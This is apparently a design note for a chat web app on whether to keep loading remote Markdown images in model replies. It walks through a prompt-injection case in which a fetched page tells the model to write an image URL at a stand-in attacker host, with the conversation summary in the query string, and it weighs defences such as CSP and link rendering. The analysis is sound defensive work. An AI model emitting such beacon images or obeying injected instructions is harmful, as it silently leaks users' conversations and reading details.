# Remote images in model replies

A Markdown image the model writes — `![chart](https://example.com/c.png)` — renders as an
`<img>`, and the browser fetches it the moment the block lands. Nobody clicks anything. Today
that is allowed on purpose: `D_markdown_renders_no_html` keeps http/https URLs, and the CSP's
`img-src 'self' http: https:` (`Web::App::CONTENT_SECURITY_POLICY`) lets them load. This idea
is whether to keep it.

## The problem: an automatic, invisible request to a URL the attacker picked

A prompt injection in a page a tool fetched can tell the model to write
`![](https://evil.example/p.gif?d=<summary of the conversation so far>)`. The tab fetches it;
the data is gone. It is *the* classic LLM-chat exfiltration route, and what makes it worse than
the egress the agent already has:

- **Invisible.** A `web_fetch` to the same URL shows as a tool line in the transcript; an image
  shows as a broken-image icon, or as nothing (a 1×1 gif).
- **Repeats.** Every tab showing the conversation fetches it, every reload refetches it (cache
  aside), and reopening a saved conversation replays the block — the beacon fires again, weeks
  later.
- **From the browser, not the server.** It reveals the reader's IP, the time they read it, and
  that they read it at all — a read receipt. With `[web] bind` off loopback that may be a
  different machine from the one the agent runs on.

What it is *not*: a way to reach data the agent cannot. The reply can only carry what the model
already saw. So this is about the leak being silent and repeatable, not about new access — which
is the honest frame for `Q_worth_it`.

Our own attachments (`/c/:id/attachments/…`) are same-origin and unaffected by any option here.

## Options

- **A. Status quo.** Images load. Zero work; the exposure above stays.
- **B. Don't fetch: render a remote image as a link** — what pikuri-tui does, which draws
  `(alt – src)` as text and fetches nothing. In {Util::MarkdownRenderer.scrub}, turn an `:img`
  with a remote `src` into an `:a` showing the alt text and the URL; tighten the CSP to
  `img-src 'self'` so nothing slips past. A click is a visible, deliberate act, and the URL is
  on screen before it. Smallest change; same behaviour in both shells.
- **C. Click to load.** Render a placeholder (`<img>` with no `src`, the URL in a `data-`
  attribute); a click in `transcript.js` sets `src`. Keeps inline images one click away, but
  the CSP must still allow `https:`, so the protection lives in markup alone — and it is a new
  piece of client mechanics with its own per-block state, which a re-render or a snapshot
  would reset (`D_details_survive_rewrites` is the warning there).
- **D. Host allowlist** (`[ui] image_hosts = ["upload.wikimedia.org"]`). An allowlisted host
  that serves user-controlled paths (most image hosts) is an open door again.
- **E. Proxy through our server** (`/img?url=…`). Hides the reader's IP, but the URL — the
  payload — still reaches the attacker, and the server becomes a fetcher of arbitrary URLs.
  Listed to be rejected.

Leaning B: it matches the TUI, it is a few lines in a function that already exists, and the CSP
backs it the way it backs the rest of `D_markdown_renders_no_html`.

## Open questions

- `Q_worth_it` — Given the agent already has egress through its tools, is a *silent* channel
  enough reason to cost inline images? The answer to this decides between A and everything
  else.
- `Q_how_often` — How often do the models we run actually emit images worth seeing? (Wikipedia
  thumbnails after a search? Charts from a URL?) If almost never, B costs nothing in practice.
  Could be checked by grepping saved `history.json` files for `![`.
- `Q_link_rendering` — Under B, what exactly does the link look like? `🖼 alt` linked to the
  URL? The URL visible, as the TUI shows it? A reader should see *where* it goes before
  clicking, which argues for the URL in text, not only in a hover.
- `Q_open_webui` — What does Open WebUI do with a model's Markdown image, and has it had reports
  about it? `R_open_webui_hardening` only records that its hardening guide never mentions
  model-mediated exfiltration; the rendering behaviour itself is unresearched, and its answer
  would extend that entry.
- `Q_referrer` — Independent of the choice: should the page send `Referrer-Policy: no-referrer`?
  Today a cross-origin fetch carries our origin (`http://127.0.0.1:4567`, or the LAN address
  `[web] bind` names) — small, but free to remove, and it also covers links the reader clicks.
